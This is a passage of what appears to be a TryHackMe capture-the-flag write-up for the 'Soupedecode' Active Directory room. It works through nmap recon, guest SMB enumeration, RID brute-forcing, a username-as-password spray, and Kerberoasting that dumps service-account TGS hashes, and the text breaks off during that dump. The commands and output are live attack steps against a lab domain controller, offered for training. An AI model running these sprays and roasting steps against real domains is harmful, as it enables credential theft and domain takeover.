This is a THM AD focused challenge with a difficulty of easy.
Challenge description:

>*Soupedecode is an intense and engaging challenge in which players must compromise a domain controller by exploiting Kerberos authentication, navigating through SMB shares, performing password spraying, and utilizing Pass-the-Hash techniques. Prepare to test your skills and strategies in this multifaceted cyber security adventure.*

## Recon

#### Port Scan

```bash
sudo nmap -Pn -sCV -p- --min-rate 2000 -T3 -oN voleur-port-scan 10.10.77.80
[sudo] password for darklight: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 22:15 EAT
Nmap scan report for 10.10.77.80
Host is up (0.21s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-14 19:17:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-14T19:18:42+00:00
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Not valid before: 2025-06-17T21:35:42
|_Not valid after:  2025-12-17T21:35:42
|_ssl-date: 2025-08-14T19:19:22+00:00; -1s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49720/tcp open  msrpc         Microsoft Windows RPC
49791/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-14T19:18:43
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 237.28 seconds
                                                                
```

One important thing we identified or rather two thing is `Domain: SOUPEDECODE.LOCAL` and `Domain Controller: DC01.SOUPEDECODE.LOCAL`

#### SMB Recon 

```bash
smbclient -L \\10.10.77.80\\                                                                             
Password for [WORKGROUP\darklight]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.77.80 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

When prompted for the password just press enter, no password is needed for this.

Two shares are intersting 
1. backup
2. Users

```bash
smbclient \\\\10.10.77.80\\Users
Password for [WORKGROUP\darklight]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> exit
                                                                                
┌──(darklight㉿jinx)-[~/Documents/ctf/thm/Soupedecode]
└─$ smbclient \\\\10.10.77.80\\backup
Password for [WORKGROUP\darklight]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> 

```

Seems we need a valid user account to enumerate the shares.

### Getting a User

Checking if the guest account is enabled:

```bash
nxc smb DC01.SOUPEDECODE.LOCAL -u 'guest' -p ''
SMB         10.10.77.80     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.77.80     445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
```

Nice, its obvious the next step is adding `--rid-brute` flag to get all users and groups 

```bash
nxc smb DC01.SOUPEDECODE.LOCAL -u 'guest' -p '' --rid-brute
SMB         10.10.77.80     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.77.80     445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
SMB         10.10.77.80     445    DC01             498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.77.80     445    DC01             500: SOUPEDECODE\Administrator (SidTypeUser)
SMB         10.10.77.80     445    DC01             501: SOUPEDECODE\Guest (SidTypeUser)
SMB         10.10.77.80     445    DC01             502: SOUPEDECODE\krbtgt (SidTypeUser)
SMB         10.10.77.80     445    DC01             512: SOUPEDECODE\Domain Admins (SidTypeGroup)
SMB         10.10.77.80     445    DC01             513: SOUPEDECODE\Domain Users (SidTypeGroup)
SMB         10.10.77.80     445    DC01             514: SOUPEDECODE\Domain Guests (SidTypeGroup)
SMB         10.10.77.80     445    DC01             515: SOUPEDECODE\Domain Computers (SidTypeGroup)
SMB         10.10.77.80     445    DC01             516: SOUPEDECODE\Domain Controllers (SidTypeGroup)
SMB         10.10.77.80     445    DC01             517: SOUPEDECODE\Cert Publishers (SidTypeAlias)
SMB         10.10.77.80     445    DC01             518: SOUPEDECODE\Schema Admins (SidTypeGroup)
SMB         10.10.77.80     445    DC01             519: SOUPEDECODE\Enterprise Admins (SidTypeGroup)
SMB         10.10.77.80     445    DC01             520: SOUPEDECODE\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.77.80     445    DC01             521: SOUPEDECODE\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.77.80     445    DC01             522: SOUPEDECODE\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.77.80     445    DC01             525: SOUPEDECODE\Protected Users (SidTypeGroup)
SMB         10.10.77.80     445    DC01             526: SOUPEDECODE\Key Admins (SidTypeGroup)
SMB         10.10.77.80     445    DC01             527: SOUPEDECODE\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.77.80     445    DC01             553: SOUPEDECODE\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.77.80     445    DC01             571: SOUPEDECODE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.77.80     445    DC01             572: SOUPEDECODE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.77.80     445    DC01             1000: SOUPEDECODE\DC01$ (SidTypeUser)
SMB         10.10.77.80     445    DC01             1101: SOUPEDECODE\DnsAdmins (SidTypeAlias)
SMB         10.10.77.80     445    DC01             1102: SOUPEDECODE\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.77.80     445    DC01             1103: SOUPEDECODE\bmark0 (SidTypeUser)
SMB         10.10.77.80     445    DC01             1104: SOUPEDECODE\otara1 (SidTypeUser)
SMB         10.10.77.80     445    DC01             1105: SOUPEDECODE\kleo2 (SidTypeUser)
SMB         10.10.77.80     445    DC01             1106: SOUPEDECODE\eyara3 (SidTypeUser)
SMB         10.10.77.80     445    DC01             1107: SOUPEDECODE\pquinn4 (SidTypeUser)
SMB         10.10.77.80     445    DC01             1108: SOUPEDECODE\jharper5 (SidTypeUser)
SMB         10.10.77.80     445    DC01             1109: SOUPEDECODE\bxenia6 (SidTypeUser)
SMB         10.10.77.80     445    DC01             1110: SOUPEDECODE\gmona7 (SidTypeUser)
SMB         10.10.77.80     445    DC01             1111: SOUPEDECODE\oaaron8 (SidTypeUser)
SMB         10.10.77.80     445    DC01             1112: SOUPEDECODE\pleo9 (SidTypeUser)
SMB         10.10.77.80     445    DC01             1113: SOUPEDECODE\evictor10 (SidTypeUser)
SMB         10.10.77.80     445    DC01             1114: SOUPEDECODE\wreed11 (SidTypeUser)
SMB         10.10.77.80     445    DC01             1115: SOUPEDECODE\bgavin12 (SidTypeUser)
SMB         10.10.77.80     445    DC01             1116: SOUPEDECODE\ndelia13 (SidTypeUser)
SMB         10.10.77.80     445    DC01             1117: SOUPEDECODE\akevin14 (SidTypeUser)
SMB         10.10.77.80     445    DC01             1118: SOUPEDECODE\kxenia15 (SidTypeUser)
SMB         10.10.77.80     445    DC01             1119: SOUPEDECODE\ycody16 (SidTypeUser)
SMB         10.10.77.80     445    DC01             1120: SOUPEDECODE\qnora17 (SidTypeUser)
SMB         10.10.77.80     445    DC01             1121: SOUPEDECODE\dyvonne18 (SidTypeUser)
SMB         10.10.77.80     445    DC01             1122: SOUPEDECODE\qxenia19 (SidTypeUser)
SMB         10.10.77.80     445    DC01             1123: SOUPEDECODE\rreed20 (SidTypeUser)
SMB         10.10.77.80     445    DC01             1124: SOUPEDECODE\icody21 (SidTypeUser)
SMB         10.10.77.80     445    DC01             1125: SOUPEDECODE\ftom22 (SidTypeUser)
SMB         10.10.77.80     445    DC01             1126: SOUPEDECODE\ijake23 (SidTypeUser)

[SNIP]

```

DAMN!! Lots and lots of users never interacted with an AD environment with so many users before. 

Based on this realization i rerun the above command but this time i specified the `MAX_RID` because by default `nxc` will reach a max of `4000` i specified a max of `10000` to be sure i dont miss any user

```bash
──(darklight㉿jinx)-[~/Documents/ctf/thm/Soupedecode]
└─$ nxc smb DC01.SOUPEDECODE.LOCAL -u 'guest' -p '' --rid-brute 10000 | grep -i "sidtypeuser" > usersdata.dump
                                                                                                                                                  
┌──(darklight㉿jinx)-[~/Documents/ctf/thm/Soupedecode]
└─$ cat usersdata.dump | wc -l
1069
                                                                                                                                                  
┌──(darklight㉿jinx)-[~/Documents/ctf/thm/Soupedecode]
└─$ head usersdata.dump 
SMB                      10.10.77.80     445    DC01             500: SOUPEDECODE\Administrator (SidTypeUser)
SMB                      10.10.77.80     445    DC01             501: SOUPEDECODE\Guest (SidTypeUser)
SMB                      10.10.77.80     445    DC01             502: SOUPEDECODE\krbtgt (SidTypeUser)
SMB                      10.10.77.80     445    DC01             1000: SOUPEDECODE\DC01$ (SidTypeUser)
SMB                      10.10.77.80     445    DC01             1103: SOUPEDECODE\bmark0 (SidTypeUser)
SMB                      10.10.77.80     445    DC01             1104: SOUPEDECODE\otara1 (SidTypeUser)
SMB                      10.10.77.80     445    DC01             1105: SOUPEDECODE\kleo2 (SidTypeUser)
SMB                      10.10.77.80     445    DC01             1106: SOUPEDECODE\eyara3 (SidTypeUser)
SMB                      10.10.77.80     445    DC01             1107: SOUPEDECODE\pquinn4 (SidTypeUser)
SMB                      10.10.77.80     445    DC01             1108: SOUPEDECODE\jharper5 (SidTypeUser)
                                                                                                                                                  
┌──(darklight㉿jinx)-[~/Documents/ctf/thm/Soupedecode]
└─$ tail usersdata.dump
SMB                      10.10.77.80     445    DC01             2158: SOUPEDECODE\PC-86$ (SidTypeUser)
SMB                      10.10.77.80     445    DC01             2159: SOUPEDECODE\PC-87$ (SidTypeUser)
SMB                      10.10.77.80     445    DC01             2160: SOUPEDECODE\PC-88$ (SidTypeUser)
SMB                      10.10.77.80     445    DC01             2161: SOUPEDECODE\PC-89$ (SidTypeUser)
SMB                      10.10.77.80     445    DC01             2162: SOUPEDECODE\PC-90$ (SidTypeUser)
SMB                      10.10.77.80     445    DC01             2163: SOUPEDECODE\firewall_svc (SidTypeUser)
SMB                      10.10.77.80     445    DC01             2164: SOUPEDECODE\backup_svc (SidTypeUser)
SMB                      10.10.77.80     445    DC01             2165: SOUPEDECODE\web_svc (SidTypeUser)
SMB                      10.10.77.80     445    DC01             2166: SOUPEDECODE\monitoring_svc (SidTypeUser)
SMB                      10.10.77.80     445    DC01             2168: SOUPEDECODE\admin (SidTypeUser)

```

`1069` users, this is crazy and interesting.

From the challenge description:
> *... players must compromise a domain controller by exploiting Kerberos authentication, navigating through SMB shares,... *

we have to exploit kerboros authentication, i guess this is how we get our first user account, its giving kerberoating or ASREP-roasting.

Kerberoating didn't work, so did AS_REP roasting. 
```bash
impacket-GetUserSPNs SOUPEDECODE.LOCAL/guest:'' -dc-ip 10.10.77.80 -no-pass -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A58, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c

```

Got stuck for a while .. tried some crazy stuff like using `kerbrute` to check valid users LOL...

Then i tried to check is they is any user using his/her username as a password and boom, we got one user.

```bash
 nxc smb DC01.SOUPEDECODE.LOCAL -u users.txt -p users.txt --no-brute --continue-on-success
SMB         10.10.77.80     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:Administrator STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\DC01$:DC01$ STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\bmark0:bmark0 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\otara1:otara1 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\kleo2:kleo2 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\eyara3:eyara3 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\pquinn4:pquinn4 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\jharper5:jharper5 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\bxenia6:bxenia6 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\gmona7:gmona7 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\oaaron8:oaaron8 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\pleo9:pleo9 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\evictor10:evictor10 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\wreed11:wreed11 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\bgavin12:bgavin12 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\ndelia13:ndelia13 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\akevin14:akevin14 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\kxenia15:kxenia15 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\ycody16:ycody16 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\qnora17:qnora17 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\dyvonne18:dyvonne18 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\qxenia19:qxenia19 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\rreed20:rreed20 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\icody21:icody21 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\ftom22:ftom22 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\ijake23:ijake23 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\rpenny24:rpenny24 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\jiris25:jiris25 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\colivia26:colivia26 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\pyvonne27:pyvonne27 STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\zfrank28:zfrank28 STATUS_LOGON_FAILURE 
'SMB         10.10.77.80     445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317' 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\file_svc:file_svc STATUS_LOGON_FAILURE 
SMB         10.10.77.80     445    DC01             [-] SOUPEDECODE.LOCAL\charlie:charlie STATUS_LOGON_FAILURE 

```

> ybob317:ybob317 

DOuble checking the creds

```bash
 nxc smb DC01.SOUPEDECODE.LOCAL -u ybob317 -p ybob317                                 
SMB         10.10.77.80     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.77.80     445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 

```

## Lateral Movement

#### Kerberoasting

for some reason am still obsessed with this attack:

```bash
impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.10.77.80  -request -outputfile tgs.txt
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 20:32:23.726085  <never>               
FW/ProxyServer          firewall_svc              2024-06-17 20:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-17 20:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-17 20:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 20:29:18.511871  <never>               



[-] CCache file is not found. Skipping...
                                                                                                                                                  
┌──(darklight㉿jinx)-[~/Documents/ctf/thm/Soupedecode]
└─$ cat tgs.txt          
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$370a698101c515f883685d182ec0f10a$4e01ab2c402ce55961a825120f356766326419ce81c2974e0b45fee6602743ffecb5454de393b670f1dfe8caba13395ee8999ab6657f301daec38988965fb5197e8b90c2f8d8e095147bfd2a0d03ded773f3f1f12d0a05c41eb7962cdfb45a70c6dd64d72cd382dcd4c7a627f55546000e46a2f588d8acad80d913beee30439086e865cc1d260c7f307af1da1322bbf9264c4672d3a70bf046f94a09fb4286119eb5783470bae7d4f7a84c113d1c75f07b5640d56065a4e62cc70d54690b02744983f982bf30deffe785778e6e75aa4e554a12bd0fb1e86f9c0c1b53758d2663085846b335f953b16c6751ea9dbe48728f7f28ceb9a9c46a25f5fa060a00ee9db0173d5043df84565cefdb32a2254bd34ead8b6d122f450a9d354bca2cc8decf42854ffe20023e649afbb4271785a1560e2333d63408015ce48b973aa4f8ff265d5678dfbe771d2a3cbe5fde7ba5fd9bb129b7c202c343f7ebae722667d6a5bfe35f62ad2bbe0f5fa0a6fdfb8921b83534da93fb91c3f42eac979473d274c9edd013ddc74f2ce72ffe1609a62f648820ebe74f60d6f1b12bf449e69d036ebc7d253fb27553485dbbe9654da26e7941ea4fa0e88a864c23c07366a441ac66367006f708167deeeb99d06ae7c90c133c92fdc107a7a6a5ceda88ff3f579cc623a7454be086e2b50058a489466740f0999b4a26da03e94f31fe693547b75aaf2b11cebf2e86d779906d5edde67c9bfcfc96af90f52f945d0cb4bed9c2b41a735d8eaf795d3adea28ff78b856799682d43b668c46e2a90760d1d076f2539ade1325069418238dacf918571d90cb1c6529e482fa926ba4fc6875ad64992087ba53d9fb657797cd2dad963aeb96a44a0cd3621f48f4632284db3477dc8fb0b62fff39a61a0c8c7a267a3496bb5a1227a0d7631196bf8e9f132146dbe628ae03d4f02dcbb423379ebc71059f94e5b35a04fa19a9c3e905361826f63a814c81c76f457d15489f86ceaf6fd92134fdd319f65b2f4d8c2d56e37e9cedc10063e0c7ff5dd1b713145afbe6f923135bb2e766c57cbf6ee9d932608031d6d5357f0c81956a88b48730e2cc28f190345630483737de29856ff38b01c75574651551a5505801a091354e8a20675b3dad2388d106e732ab390abb510ebaadc2f4781ad2cf60c3c84d4a25e4f9c17ed5df6589c9f64c606f695c17cae97bcc536437efb6ff16146bcc187e822ce768f80b771a18a891220363f9fdef2dddf69bc56804e0b96c1a820a20f54612472fb25bc282398cb4d047ac6e08bf76bb31bab5ce6a248bd79862cdb8a4aa6f8d48c6d4d111104e29539a3d08b246f06d0fb9edf813531c1b6cad4cc9d2840ad8270dbb011a0c122d7142355d8f63fba283dc77dc42aae435c92e0ca906771e933bbbc77e1eff1b294246f4bc951693a7361779d8536a4805d521e217205610bb0175271086d3e4e821524896974fe21eed7a82769affaa924cf39bd
$krb5tgs$23$*firewall_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/firewall_svc*$02f27dcea3cc6682e869a3b6434673a4$f6b14b93a104206aefadee2bcf918b9fccfeb76d11b09ff9f18cbf3d85fe9913e2a36ff9928345d94d51347457d9b5019ebcd550cee4c835091c715e2396bbb13cbbfe60c090f20b0029fa754545ed1789c9af914f8dc76198dc2a5b15bcb4df9c7689fb84b61b38ed92b55a0bfa04dbe61847cca4bc6a2242db30dc773a6a9cf11b2c829e077f929431af9c2640fb5a55c575b5f50356bfd209a55dc76adb75913c85c64ca681cc6dad3c44af947b7719de9e8d6e32882830cffb8e1b5c29a61db3ba00660c52156e85c4d866dfbf18a0985b3fe4e419e8210b7006ab10108f796084b8b04432e55f2abdb2e72b6240577770b7d8c6b7d9db3c8009156e0b7ca1afcd730772c6f193500957087cb782379f41ecdc97a27363ee08563a3992787dfe3632bcb90a8dc00a4dd52fc298db1173a9a47217014fec18370af8ebbec1c4ddc197d7e24cc629add77a125626488953f943adc06f69faff6f2617c109a8fe8bd864a250e014411ce999be241325bc374ca8a912e7eeb23a36c069cd048129b899f697cf2ca92c44611d3da74a170629475efe3a459d538637f8dc35feb8148f711af3b2e8b7d7a9a148900e7b3ae9898142fb1b11a2c3221de9a3cd7c20d041855b2e1c81f748b2360862645498d79ec36bddfac312d14639c6dabb1e41d74936f95aa5c1a2a69adeb9b7fa9354db8ace333e651ac347c2db387ef4961650ebed69a28df9b0bf54ebee30c613e7d106aa8b8ad301fe4a32316579a8817e757e4afdbbc04fc4679ce1f85918698ef2c60e504f1003c1ecad6dadaeffbe719bcfa2680bbc4da08bcd7381ac5d17247365df7223ad1800d75950ef2731a31a979061add9e0026a72c72a4ff79d782347c6a2c0d6111cea30deba19123f2c5458f499e1677acad136fae9122e2186e98145c31dbc4eb3bef5d3f0da116cebbaa88f6b2d0897fca51f7a54d5887d01e24fbdb7f06fdfc261fa0aafaac3b48bcc27c6390e0a764b65ba77341226271eab67987a51517f89010e88604ebaae057bc7b1ccb08920d13ac4b0ce6f675697ec96e9a4a3164ef7ca2f17d025a2daf4420955bfdc1cc5f4271b5b05ca05156e97bb3ef019113024de63b8c8b749d0b204e102461ba4e8a83d8c1bd355863528d0e5ee2a3a9df6a07f8695f0e9c3feee4751868e2a317b8268d87e026cd67441aa91832d23e2d38dafc8ae07590bd059576a3fbdbb28a33a93eb8c1ede3ef901e0b5daaf81afbcefd48bfb49404d293a1c873084a47c0c6be4df97315756f5f70e8931a7cedf0efe362dd8c7eb82ba93c5df75bbc5a2adf53c9d35df14ef3b06a42b9ed570caa6d3456022bf119f5dbf70eab41d79c5552d127e2aab304035322d687e662fe566faccb841e3f5bf3fd887a4abb289bb0c1f0c52fb6d2c07c06e89fa7cc2ee595d760c65feb1a51b1101ff626dc2d6a05ed2834990a562523241ecfde23d031f98cb9716d4a36c90d817af4b
$krb5tgs$23$*backup_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/backup_svc*$ff73b4e98fe995d824d2da1f1c95cdcb$aa2c2117046fe3413bc99b9f8cb4c61c9437eaa052e5cd5e0ba60615e94d244d3889f7bcabb76b8f927b0b226696536b9dcdefe4a1d908a139dfed7cc6a5bdb80a57b40434c52243df349f80d3878e1c34d0f74c0b2bcfdf952658eaefa26fc9f3c1f69dfdf5b8e90df174ae34a6f0b846b81117dc035a4ce195b0192c4c2a38d8b379d7a0fa2112e83cbca9bda5e0bc197fe1701dd63ca98f972f4348e649746461e40d998f9f40843af37cebe0a9b45eebbbd89b7907c480bee2270164cad1a03c7008cb47ce6db7299f5ea0311746c1106742b8f4b3219c3bfe48f892ba6cbf88809c0b91447202b89b1e0bdff02f62738acad6f0a10346f6527befabdb8857d7c923aeb7cbdd6ce8a2e4fea9764eda6bb24c777b614c45934ff836162fc1ab4294f50b4fa04ce068241c54ef03b24ee15a48d4bcba7d71bec9a6ea101e71302971e886fa218790b98f5efbc268f34a057135ee1919f2c89350e6c9f17059d4e26ba43b948c2e93e4914b9ab461a0d06a5f313b1fb433e12e020da78c8d95698b9059bfc6a25e9d6116a91f3bce5aff76c84a69cfa0602292312b5c52f5149a421f634104b91d4ea2eff013b7b72bc5ba2c21e9f24f22d9481a03d0c4d92406b97cbb40394e726e25fcd1b27173882f47e9984af89e85b9da7dff2e63c48aaa32c3bf1e0618313449bf7520dd117630cc7c9dafb75bbfde9edc5b16a4e261df500087e97d8d42ac9b677cad6fe41012a9cc955ee46bd94b9825c0cf0d098235e19e53b672e06bae4ff3a80a7cefb026b96353acde49e523c7231237596b94d4af64a4c2a35d4b2a3b58866b3c759c87a9848074ed48ac5f389c5a0bc0802f10b184dc78f4e9fb16b2972ed2899f1bfbab0d21df49a6a9f8c5a343e5dda48f5ae6e60948b36ec65f65b0cf22697edce29ed3489b76747f760319733c53a17ec4d4612c2a96c2600ada8deaa33ce51bb71860a6b546f81f7b14fc3a27a38fe9d2894ed86b62a07a7d5722ac2e7218000112485249d35715b9d2d2fe86bebff18934c21bb72e3eb38669c00ab9075b2fed5dd058c0140fe30fe95f396f0864a9d1f962d81fb064f7d8fc550a69f4ccbce459784b514ea2c11c505d419153d3b98562da6f1b69d7f228a762d2f7cc6733b6560c10347e21f84bf1a8a1f00f7a0e951539075e2e6b34e641ee91914a7e942a5614b0224a0a9aa32cddfde1f63830a400508d88faa16b2e868f6a38a4c8f8d003e73eb8140837d7ec65147a2c15c929e9ca8997d409dfcf3b80d5827e7526deed676f31973460167a683298b8125e7fbbe2a4fb23fb6b982d9cc9a133b861d3d42b330d945b53b2513b9839b5af9bbb483159db2fe15a36e79f1a5e97bb2c51931e6534110a2e265ba08ce126f05ce642c291fd9696554e4be66ed5f26058f2c802c915e2d244865a0c6be39871d78eb4c04a08d4033b4bbb2570fec725eef6ff496a2ab625d45b3dcc44e766f770b5
$krb5tgs$23$*web_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/web_svc*$7c0dd99353789de1f15064ebe76ca458$0bb62f2f0269b9af1f3e07b094c930997d8b0b73cce7abec67e11d2bfe49fa35c655b843ee2634cd768d2619f89fbaca4898bb64596fe428edcf2a84db944f0a207e7d54864584a0910751c88c470f9ac287fc0fd7fbb14ed3af1364c191e4e06b8705526bf61af0e5b381e8f9996829541cbcb66b9ac4f8354e246c679dd421cccdae7d25da097bbd7a2feecfab572ae936ca89b11ff617d2b249ede6c3ae81bb5e4d2f2ecbc4866569222e252187fa0a05487ff7efb661b0d8c2093f32a86e37c9ab4f34600e47f65181148fb9bfaa74ee696b1f878ef56c7da29fe2659f79f25459d520d3c21790f67dac2b2a1777ee14df2229e1424b4bfba144a2f25e5a41122f5daf48046598fb72d9ce0330a0096b81573e28250f530641839f04785c95495f50edef704501d2eb8268793918f7e4f54c1159f89e49bd6dcfecf4fcbb04438daa5c197a1f007c05a758169f971a6c13cea89f4fb8f68da6446d84ee5a5180f6d3fa5ce91f309c5b8c83993aa72ba20dd01ffa3354f98886af44bc5111e08180ab1b1b58df87bd3db4dbac452f05b6d47c9aef3505a0082ddacbf8ae17812f24fea04c4ddbcb8caf0a0da7e740a310d24dd62ddc9920c9c2699d77e421c8e50e264c855bb21a9f4c2ecb9d73fb1d68c9eaad61eb2d3af20dbd32dff7e8558230a2c35b09e7ae88be066fdeb8578fd7d18cf9d3fc12148c8008f33555621b6de103e8a0682bc09c51266bf0c9e14f3f437137e098c141121320a2080383f48684a414253c6af2d6496c134942c995252267d510dedd60ea4221945866454ddd16c1652a33a3f52400c6a57a58e653f9aeded27fd3245c4e013cf8db6a9b2a151a7b929c2b6f95e27223ef4ef0da600ce3b5141316183ddbef9b61e8ef9c7e9d4b684d0447b32412520f17af9af083762f400d3f978632634739e94c0c2ae3bfe9d136be88b2cb404cc09542a948eca8e5923c6a8132f986a8cdd601eef0877cdf225d848668ba22955158feb28c867c8ff78456809ce959dfea704645ab3254d9be55a1ce4013